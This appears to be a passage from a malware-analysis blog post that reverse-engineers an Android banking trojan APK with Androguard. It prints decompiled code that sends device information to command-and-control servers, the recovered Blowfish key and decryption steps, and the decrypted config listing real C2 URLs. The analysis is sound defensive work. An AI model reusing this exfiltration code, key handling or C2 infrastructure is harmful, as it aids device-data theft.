   protected void onCreate(android.os.Bundle p5) 
   { 
       super.onCreate(p5); 
       this.setContentView(1.741289080126432e+38); 
       
this.show_hide(Integer.valueOf(com.gmail.xlibs.myFunctions.getVar("PASSADDED", 0, 
this))); 
       com.gmail.xlibs.myFunctions.sendLog("START", "Service started", this); 
       this.startService(new 
android.content.Intent("XMainProcessStart").putExtra("name", "value")); 
       return; 
   } 

Ok letâ€™s have a look at com.gmail.xlibs.myFunctions:

methods = d.CLASS_Lcom_gmail_xlibs_myFunctions.get_methods() 
for m in methods: print(m.get_name()) 

9/26



<init> 
IntToStr 
StrToInt 
checkPhone 
deviceInfo 
foundCodeInSms 
getCheckedURL 
getFirst 
getRawData 
getSecond 
getVar 
getVar 
in_array 
isOnline 
loadNumFromPreferences 
parseXml 
sendFromDb 
sendLog 
sendMessge 
setK12 
setVar 
setVar 
setVarsList 
typeInternetConnection 

Having a look at the whole class you can see that there are a lot of methods. But this one
looks very interesting:

d.CLASS_Lcom_gmail_xlibs_myFunctions.METHOD_setK12.source() 

   public static String setK12(String p4, android.content.Context p5) 
   { 
       String v2; 
       String v1 = com.gmail.xlibs.myFunctions.getVar("BLFSK", "", p5); 
       if (v1.length() <= 0) { 
           v2 = ""; 
       } else { 
           v2 = new com.gmail.xlibs.Blowfish(v1, "base64", "12345678").encrypt(p4); 
       } 
       return v2; 
   } 

Decrypting stuff
Apparently there is an encryption routine (Blowfish) used for some stuff. In this case a new
class v2  is initialized. The constructor gets several parameters:

content of BLFSK  ( v1 )
base64 (I thing this sort of flag)
â€œ1234578â€ (Looks like some IV)

Letâ€™s have a look at the Blowfish class:

10/26



d.CLASS_Lcom_gmail_xlibs_Blowfish.METHOD_init.source() 

   public Blowfish(String p2, String p3, String p4) 
   { 
       this.IV = "12345678"; 
       this.in_out_format = "clear"; 
       this.IV = p4; 
       this.strkey = p2; 
       this.in_out_format = p3; 
       return; 
   } 

p2  (the first argument) is the key. Looking one step before letâ€™s find out whatâ€™s inside the
BLFSK  variable. First letâ€™s see where the variable is beeing used:

z = dx.tainted_variables.get_string("BLFSK") 
if z: z.show_paths(d) 

R 62 Lcom/gmail/xlibs/myFunctions;->getFirst (Landroid/content/Context;)V 
R 17c Lcom/gmail/xlibs/myFunctions;->getFirst (Landroid/content/Context;)V 
R e8 Lcom/gmail/xlibs/myFunctions;->getSecond (Landroid/content/Context;)V 
R 0 Lcom/gmail/xlibs/myFunctions;->setK12 (Ljava/lang/String; 
Landroid/content/Context;)Ljava/lang/String; 

Letâ€™s search for some content/files:

%%bash 
find output -name "blfs*" 

output/res/raw/blfs.key 

%%bash 
cat output/res/raw/blfs.key 

NfvnkjlnvkjKCNXKDKLFHSKD:LJmdklsXKLNDS:<XObcniuaebkjxbcz 

Well that looks like a key to me :). What else can we find inside output/res/raw :

%%bash 
ls -l output/res/raw 

total 8 
-rw-r--r-- 1 root root   56 Jun 25 13:26 blfs.key 
-rw-r--r-- 1 root root 1048 Jun 25 13:26 config.cfg 

%%bash 
cat output/res/raw/config.cfg 

HoBbgAt+xT9vXJUlyhYYAVOx5Oy4XSMLyc7JC+ly5a1tbUtWvFMny2yqavP9D9GT0ogg2U4LN5FZE8/0Y2duLg

Iâ€™ve checked that content and itâ€™s base64:

11/26



%%bash 
base64 -d output/res/raw/config.cfg > output/res/raw/config.cfg.raw 
file output/res/raw/config.cfg.raw 

output/res/raw/config.cfg.raw: data 

Ok. Now letâ€™s decrypt that file. But first letâ€™s have a look at the used encryption parameters:

d.CLASS_Lcom_gmail_xlibs_Blowfish.METHOD_encrypt.source() 

   public String encrypt(String p10) 
   { 
       try { 
           String v7; 
           javax.crypto.spec.SecretKeySpec v6 = new 
javax.crypto.spec.SecretKeySpec(this.strkey.getBytes(), "Blowfish"); 
           javax.crypto.Cipher v0 = 
javax.crypto.Cipher.getInstance("Blowfish/CBC/PKCS5Padding"); 
           v0.init(1, v6, new 
javax.crypto.spec.IvParameterSpec(this.IV.getBytes())); 
           byte[] v3 = v0.doFinal(p10.getBytes()); 
       } catch (Exception v1) { 
           v7 = 0; 
           return v7; 
       } 
       if (this.in_out_format != "base64") { 
           if (this.in_out_format != "hex") { 
               v7 = new String(v3, "UTF8"); 
           } else { 
               v7 = com.gmail.xlibs.Blowfish.byte2hex(v3); 
           } 
       } else { 
           v7 = android.util.Base64.encodeToString(v3, 0); 
       } 
       return v7; 
   } 

So we have Blowfish with CBC. The decryption method:

d.CLASS_Lcom_gmail_xlibs_Blowfish.METHOD_decrypt.source() 

12/26



   public String decrypt(String p9) 
   { 
       try { 
           byte[] v1; 
           javax.crypto.spec.SecretKeySpec v5 = new 
javax.crypto.spec.SecretKeySpec(this.strkey.getBytes(), "Blowfish"); 
           javax.crypto.Cipher v0 = 
javax.crypto.Cipher.getInstance("Blowfish/CBC/PKCS5Padding"); 
           v0.init(2, v5, new 
javax.crypto.spec.IvParameterSpec(this.IV.getBytes())); 
       } catch (Exception v2) { 
           byte[] v6 = 0; 
           return v6; 
       } 
       if (this.in_out_format != "base64") { 
           if (this.in_out_format != "hex") { 
               v1 = v0.doFinal(p9.getBytes("UTF8")); 
           } else { 
               v1 = v0.doFinal(com.gmail.xlibs.Blowfish.hex2byte(p9)); 
           } 
       } else { 
           v1 = v0.doFinal(android.util.Base64.decode(p9, 0)); 
       } 
       v6 = new String(v1); 
       return v6; 
   } 

As Iâ€™ve looked into the code Iâ€™ve noticed that a new Blowfish  class is initiated in
com/xlibs/myFunctions.class.

d.CLASS_Lcom_gmail_xlibs_myFunctions.METHOD_getFirst.source() 

13/26



   public static void getFirst(android.content.Context p14) 
   { 
       if (com.gmail.xlibs.myFunctions.getVar("RID", 0, p14) == 0) { 
           String v5 = com.gmail.xlibs.myFunctions.getRawData(1.754580954436089e+38, 
0, p14); 
           com.gmail.xlibs.myFunctions.parseXml(new com.gmail.xlibs.Blowfish(v5, 
"base64", 
"12345678").decrypt(com.gmail.xlibs.myFunctions.getRawData(1.754581157260185e+38, 1, 
p14)), p14); 
           int v0 = com.gmail.xlibs.myFunctions.getVar("RID", 0, p14); 
           if (v0 != 0) { 
               com.gmail.xlibs.myFunctions.setVar("BLFSK", v5, p14); 
               com.gmail.xlibs.myFunctions.setVar("RID", v0, p14); 
               String v9 = com.gmail.xlibs.myFunctions.getVar("USE_URL_MAIN", "", 
p14); 
               if (v9.trim().length() > 0) { 
                   String[] v7 = new String[3]; 
                   v7[0] = "data"; 
                   v7[1] = "rid"; 
                   v7[2] = "first"; 
                   String[] v10 = new String[3]; 
                   v10[0] = 
com.gmail.xlibs.Blowfish.base64_encode(com.gmail.xlibs.myFunctions.deviceInfo(p14)); 
                   v10[1] = 
com.gmail.xlibs.myFunctions.IntToStr(com.gmail.xlibs.myFunctions.getVar("RID", 0, 
p14)); 
                   v10[2] = "true"; 
                   try { 
                       String v8 = com.gmail.xlibs.SimpleCurl.httpPost(v9, 
com.gmail.xlibs.SimpleCurl.prepareVars(v7, v10, "UTF-8"), "UTF-8"); 
                   } catch (java.io.IOException v4) { 
                       com.gmail.xlibs.myFunctions.setVar("RID", 0, p14); 
                       v4.printStackTrace(); 
                   } catch (java.io.IOException v4) { 
                       com.gmail.xlibs.myFunctions.setVar("RID", 0, p14); 
                       v4.printStackTrace(); 
                   } 
                   v8 = v8.trim(); 
                   if ((v8 != null) && (v8.length() != 0)) { 
                       com.gmail.xlibs.myFunctions.setVar("BLFSK", v8, p14); 
                   } else { 
                       com.gmail.xlibs.myFunctions.setVar("RID", 0, p14); 
                       android.util.Log.d("HTTP", "Obnilim rid"); 
                   } 
               } 
           } 
       } 
       return; 
   } 

Especially this line is very interesting:

com.gmail.xlibs.myFunctions.parseXml(new com.gmail.xlibs.Blowfish(v5, "base64", 
"12345678").decrypt(com.gmail.xlibs.myFunctions.getRawData(1.754581157260185e+38, 1, 
p14)), p14); 

14/26



Obviously the encrypted file has some XML content which has to be parsed first. The
parseXML function requires a String parameter containing the XML code. The XML code has
to be first decrypted:

new com.gmail.xlibs.Blowfish(v5, "base64", "12345678") 

This will create a new Blowfish  object where the parameters are set as shown below:

v5
String v5 = com.gmail.xlibs.myFunctions.getRawData(1.754580954436089e+38,
0, p14);

base64
Format of ciphertext to be decrypted

12345678
The IV used for the Blowfish cipher

v5  contains the encryption key. This is have to be loaded first using getRawData . Letâ€™s
have a look at it:

d.CLASS_Lcom_gmail_xlibs_myFunctions.METHOD_getRawData.source() 

   public static String getRawData(int p9, int p10, android.content.Context p11) 
   { 
       java.io.InputStream v4 = p11.getResources().openRawResource(p9); 
       java.io.ByteArrayOutputStream v0 = new java.io.ByteArrayOutputStream(); 
       try { 
           int v3 = v4.read(); 
       } catch (java.io.IOException v2) { 
           v2.printStackTrace(); 
           String v6; 
           String v5 = v0.toString(); 
           if (p10 != 0) { 
               v6 = v5; 
           } else { 
               v6 = com.gmail.xlibs.Blowfish.byte2hex(v5.getBytes()).substring(0, 
50); 
           } 
           return v6; 
       } 
       while (v3 != -1) { 
           v0.write(v3); 
           v3 = v4.read(); 
       } 
       v4.close(); 
   } 

The first argument p9  is a shared preference and contains the name of the file the content
should be read from. Using another decompiler l I had a look at the getFirst  method and
found this:

15/26



... 
String str1 = getRawData(2130968576, 0, paramContext); 
String str2 = getRawData(2130968577, 1, paramContext); 
parseXml(new Blowfish(str1, "base64", "12345678").decrypt(str2), paramContext); 
... 

Now what are those numbers: 2130968576 and 2130968577? Those are ressource
identifier. If we hex them weâ€™ll have:

hex(2130968576) = 7f040000 and  
hex(2130968577) = 7f040001 

Letâ€™s search the files for this pattern:

%%bash 
grep -r "7f040000" output/* && grep -r "7f040001" output/* 

output/res/values/public.xml:    <public type="raw" name="blfs" id="0x7f040000" /> 
output/smali/com/gmail/xpack/R$raw.smali:.field public static final blfs:I = 
0x7f040000 
output/res/values/public.xml:    <public type="raw" name="config" id="0x7f040001" /> 
output/smali/com/gmail/xlibs/myFunctions.smali:    const v11, 0x7f040001 
output/smali/com/gmail/xpack/R$raw.smali:.field public static final config:I = 
0x7f040001 

So those numbers are indeed ressources. What kind of?

%%bash 
grep "7f04000" output/smali/com/gmail/xpack/R\$raw.smali 

.field public static final blfs:I = 0x7f040000 

.field public static final config:I = 0x7f040001 

Bingo! Now we know that:

2130968576 -> 7f040000 -> blfs.key 
2130968577 -> 7f040000 -> blfs.cfg 

So letâ€™s summarize some things:

getFirst() calls getRawData twice
1. getRawData("blfs.key", 0, paramContext);
2. getRawData("config.cg", 1, paramContext);

In getRawData() there is no magic happing: Some file stream is created and then the conten
is read. BUT: There is one catch about it:

if (p10 != 0) { 
    v6 = v5; 
} else { 
   v6 = com.gmail.xlibs.Blowfish.byte2hex(v5.getBytes()).substring(0, 50); 
} 

16/26



p10  is the 2nd argument given to getRawData. If you pay attention you may notice that if
p10  == 1 nothing special will happen. Otherwise (content of blfs.key is read out) there are

some string manipulations taking place. This took me a while to notice it and was the reason
I couldnâ€™t decrypt the config.cfg. This is what it does with the content of blfs.key :

convert string to byte array
convert byte array to hex string
take only the first 50 bytes

In the end v6  will contain the decryption key. Using PyCrypto weâ€™ll try to decrypt the content
in Python:

from Crypto.Cipher import Blowfish 
from Crypto import Random 
from struct import pack 
from binascii import hexlify, unhexlify 

# Read content from files 
blfs_key = !cat output/res/raw/blfs.key 
ciphertext_base64 = !cat output/res/raw/config.cfg 
ciphertext_raw = ciphertext_base64[0].decode("base64") 

# Some settings 
IV = "12345678" 
_KEY = blfs_key[0] 
ciphertext = ciphertext_raw 

# As seen in the source code:  
#  * hex-encode the blfs key 
#  * take only the substring[0:50] 
KEY = hexlify(_KEY)[:50] 

# Do the decryption 
cipher = Blowfish.new(KEY, Blowfish.MODE_CBC, IV) 
message = cipher.decrypt(ciphertext) 

message 

'<?xml version="1.0" encoding="utf-8"?>\n          <config>\n            <data 
rid="25" \n                  shnum10="" shtext10="" shnum5="" shtext5="" shnum3="" 
shtext3="" shnum1="" shtext1="" \n                  del_dev="0" \n                  
url_main="http://best-invest-int.com/gallery/3.php;http://citroen-
club.ch/images/3.php" \n                  url_data="http://best-invest-
int.com/gallery/1.php;http://citroen-club.ch/images/1.php" \n                  
url_sms="http://best-invest-int.com/gallery/2.php;http://citroen-
club.ch/images/2.php"\n                  url_log="http://best-invest-
int.com/gallery/4.php;http://citroen-club.ch/images/4.php"\n                  
download_domain="certificates-security.com"\n                  ready_to_bind="0" />\n 
\n          </config>\x05\x05\x05\x05\x05' 

Yeay! Now a more structured look at the XML:

17/26



from lxml import etree 
import xml.etree.ElementTree as ET 

# Remove dirty characters 
xml = message.replace("\x05", "").replace("\n", "") 

# Create XML tree from string 
root = etree.XML(xml) 
data = root.xpath("/config//data") 

frame = [] 
# Get data 
for sample in data: 
   for attr_name, attr_value in sample.items(): 
       values = attr_value.split(";") 
       for v in values: 
           frame.append((attr_name, v)) 

# Show attributes found in /config/data 
df = pd.DataFrame(frame, columns=['Attribute', 'Value']) 
df

Attribute Value
0 rid 25

1 shnum10

2 shtext10

3 shnum5

4 shtext5

5 shnum3

6 shtext3

7 shnum1

8 shtext1

9 del_dev 0

10 url_main http://best-invest-int.com/gallery/3.php

11 url_main http://citroen-club.ch/images/3.php

12 url_data http://best-invest-int.com/gallery/1.php

13 url_data http://citroen-club.ch/images/1.php

14 url_sms http://best-invest-int.com/gallery/2.php

18/26



Attribute Value

15 url_sms http://citroen-club.ch/images/2.php

16 url_log http://best-invest-int.com/gallery/4.php

17 url_log http://citroen-club.ch/images/4.php

18 download_domain certificates-security.com

19 ready_to_bind 0

Inspect malwares config
Looks interesting. Are those URLs still available?

import urllib2 
 
# Get URLs from DataFrame (only the valid ones) 
urls = df['Value'][10:19].tolist() 
#urls = ["http://google.de/", "http://blog.dornea.nu/about"] 
resp = {} 

def get_status_code(host, path="/"): 
   """ This function retreives the status code of a website by requesting 
       HEAD data from the host. This means that it only requests the headers. 
       If the host cannot be reached or something else goes wrong, it returns 
       None instead. 
   """ 
   try: 
       conn = httplib.HTTPConnection(host) 
       conn.request("HEAD", path) 
       return conn.getresponse().getheaders() 
   except StandardError: 
       return None 

# Iterate through URLs 
for u in urls: 
   p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*)/(?P<path>.*)' 
   m = re.search(p, u) 
   if m: 
       status_code = get_status_code(m.group('host'), "/" + m.group('path')) 
       resp[u] = status_code 
resp 

19/26



{'http://best-invest-int.com/gallery/1.php': None, 
'http://best-invest-int.com/gallery/2.php': None, 
'http://best-invest-int.com/gallery/3.php': None, 
'http://best-invest-int.com/gallery/4.php': None, 
'http://citroen-club.ch/images/1.php': [('date', 
  'Fri, 04 Jul 2014 08:31:12 GMT'), 
 ('content-type', 'text/html; charset=iso-8859-1'), 
 ('server', 'Apache')], 
'http://citroen-club.ch/images/2.php': [('date', 
  'Fri, 04 Jul 2014 08:31:12 GMT'), 
 ('content-type', 'text/html; charset=iso-8859-1'), 
 ('server', 'Apache')], 
'http://citroen-club.ch/images/3.php': [('date', 
  'Fri, 04 Jul 2014 08:31:11 GMT'), 
 ('content-type', 'text/html; charset=iso-8859-1'), 
 ('server', 'Apache')], 
'http://citroen-club.ch/images/4.php': [('date', 
  'Fri, 04 Jul 2014 08:31:12 GMT'), 
 ('content-type', 'text/html; charset=iso-8859-1'), 
 ('server', 'Apache')]} 

Hmmm.. Nothing special. The servers might have been patched meanwhile against this
malware. I hope weâ€™re going to see more when doing the dynamic analysis.

Control Flow Graph (CFG)
%%bash 
mkdir DEX 
cp 7276e76298c50d2ee78271cf5114a176 DEX 
cd DEX 
unzip 7276e76298c50d2ee78271cf5114a176 
cd .. 

Archive:  7276e76298c50d2ee78271cf5114a176 
signed by SignApk 
 inflating: META-INF/MANIFEST.MF     
 inflating: META-INF/CERT.SF         
 inflating: META-INF/CERT.RSA        
 inflating: AndroidManifest.xml      
 inflating: classes.dex              
extracting: res/drawable-hdpi/ic_launcher1.png   
extracting: res/drawable-hdpi/logo.png   
extracting: res/drawable-ldpi/ic_launcher1.png   
extracting: res/drawable-mdpi/ic_launcher1.png   
extracting: res/drawable-xhdpi/ic_launcher1.png   
 inflating: res/layout/actup.xml     
 inflating: res/layout/main.xml      
 inflating: res/layout/main2.xml     
 inflating: res/menu/main.xml        
extracting: res/raw/blfs.key         
 inflating: res/raw/config.cfg       
 inflating: resources.arsc           

20/26



import hashlib 
import StringIO, pydot 
from IPython.display import Image 
from androguard.core.bytecodes.dvm import * 
from androguard.core.analysis.analysis import VMAnalysis 
from androguard.core.bytecode import method2dot, method2format, method2png 

d = DalvikVMFormat(open("DEX/classes.dex").read()) 
x = VMAnalysis(d) 
d.set_vmanalysis(x) 

# Utilities 
def create_graph(data, output): 
   # Stolen from androguard/core/bytecode.py 
   buff = "digraph {\n" 
   buff += "graph [rankdir=TB]\n" 
   buff += "node [shape=plaintext]\n" 
    
   # subgraphs cluster 
   buff += "subgraph cluster_" + hashlib.md5(output).hexdigest() + " 
{\nlabel=\"%s\"\n" % data['name'] 
   buff += data['nodes'] 
   buff += "}\n" 

   # subgraphs edges 
   buff += data['edges'] 
   buff += "}\n" 
    
   graph = pydot.graph_from_dot_data(buff) 
    
   return graph 

com.gmail.xlibs.myFunctions: getFirst()

# Definition:  d.get_method_descriptor(self, class_name, method_name, descriptor) 
# 
# Examples for method descriptors: 
#   R 62 Lcom/gmail/xlibs/myFunctions;->getFirst (Landroid/content/Context;)V 
#   R 17c Lcom/gmail/xlibs/myFunctions;->getFirst (Landroid/content/Context;)V 
#   R e8 Lcom/gmail/xlibs/myFunctions;->getSecond (Landroid/content/Context;)V 
#   R 0 Lcom/gmail/xlibs/myFunctions;->setK12 (Ljava/lang/String; 
Landroid/content/Context;)Ljava/lang/String; 

m = d.get_method_descriptor("Lcom/gmail/xlibs/myFunctions;", "getFirst", "
(Landroid/content/Context;)V") 
buff_dot = method2dot(x.get_method(m)) 

graph = create_graph(buff_dot, "png") 
Image(graph.create_png()) 

21/26



22/26



com.gmail.xlibs.myFunctions: getSecond()

m = d.get_method_descriptor("Lcom/gmail/xlibs/myFunctions;", "getSecond", "
(Landroid/content/Context;)V") 
buff_dot = method2dot(x.get_method(m)) 

graph = create_graph(buff_dot, "png") 
Image(graph.create_png()) 

com.gmail.xservices: XRepeat
getFirst  and getSecond  are both called from the class
com.gmail.xservices.XRepeat  in the method doInBackground . Letâ€™s search for the

appropriate method descriptor:

23/26



# We should have a list of PathP objects which represent where a specific method is 
called: 
paths = x.tainted_packages.search_methods(".", "onReceive", ".") 
paths 

[<androguard.core.analysis.analysis.PathP instance at 0x101a5290>] 

# Get the class manager from the VM 
cm = d.get_class_manager() 

src = [] 
dst = [] 
# Iterate through paths 
for p in paths: 
   src.append(p.get_src(cm)) 
   dst.append(p.get_dst(cm)) 

df_src = pd.DataFrame(src, columns=['From', 'Method', 'Type']) 
df_dst = pd.DataFrame(dst, columns=['To', 'Method', 'Type']) 
display_html(df_src) 
display_html(df_dst) 

From Method Type
0 Landroid/support/v4/content/LocalBroadcastMana... executePendingBroadcasts ()V

To Method Type
Landroid/content/BroadcastReceiver; onReceive (Landroid/content/Context;

0 Landroid/content/In...

m = d.get_method_descriptor("Lcom/gmail/xservices/XRepeat;", "onReceive", "
(Landroid/content/Context; Landroid/content/Intent;)V") 

buff_dot = method2dot(x.get_method(m)) 
graph = create_graph(buff_dot, "png") 
Image(graph.create_png()) 

24/26



Conclusion
Iâ€™ve found cool new ways how to analyze an APK using python tools. AndroGuard seems to
be a quite good framework to work it. Although Iâ€™ve managed it to get almost everything
working, I must say that the project itself (and its components!) arenâ€™t well documented. Then
I had several errors like this one:

# ~/work/bin/androguard/androdd.py -i FakeBanker.apk -f PNG -o neu 
Dump information FakeBanker.apk in neu 
Clean directory neu 
Analysis ... End 
Decompilation ... End 
ERROR: module pydot not found 
Dump Landroid/support/v4/app/FragmentManager; <init> ()V ... PNG ... 
Traceback (most recent call last): 
 File "/root/work/bin/androguard/androdd.py", line 222, in <module> 
   main(options, arguments) 
 File "/root/work/bin/androguard/androdd.py", line 207, in main~~~~ 
   export_apps_to_format(options.input, a, options.output, options.limit, 
options.jar, options.decompiler, options.format) 
 File "/root/work/bin/androguard/androdd.py", line 180, in export_apps_to_format 
   method2format(filename + "." + format, format, None, buff) 
 File "/root/work/bin/androguard/androguard/core/bytecode.py", line 338, in 
method2format 
   error("module pydot not found") 
 File "/root/work/bin/androguard/androguard/core/androconf.py", line 270, in error 
   raise() 
TypeError: exceptions must be old-style classes or derived from BaseException, not 
tuple 

25/26



But I donâ€™t want to complain about the project. In fact I think its the most comprehensive tool
bundle out there for analytical purposes. If you know better alternatives just let me know
about it. In the next part Iâ€™ll be writing about dynamic code analysis. So stay tuned :)